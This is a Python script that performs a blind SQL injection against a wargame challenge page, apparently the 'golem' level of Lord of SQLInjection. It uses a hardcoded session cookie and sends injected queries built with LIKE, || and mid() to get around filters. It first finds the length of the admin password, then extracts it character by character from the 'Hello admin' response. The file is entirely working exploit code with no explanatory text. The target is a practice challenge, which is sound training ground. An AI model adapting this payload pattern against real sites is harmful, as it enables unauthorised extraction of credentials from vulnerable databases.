from urllib.request import urlopen
import urllib
import requests

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
session = dict(PHPSESSID = "0jtlu4osislbgbgslno5s4iafp")

print ("! Start")

print ("! Find length of the password")

for i in range(0, 20):
	try:
		query = url + "1' || id like 'admin' %26%26 length(pw) like " + str(i) + "%23"
		r = requests.post(query, cookies=session)
	except:
		print ("! Error")
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print ("! Found length : ", length)

print ("! Find password")

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' || id like 'admin' %26%26 mid(pw, " + str(j) + ", 1) like '" + chr(i)
			r = requests.post(query, cookies=session)
		except:
			print ("! Error")
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print ("! pw " + str(j), ":", flag)
			break

print ("[+] Found pw : ", flag)
print ("[+] End")
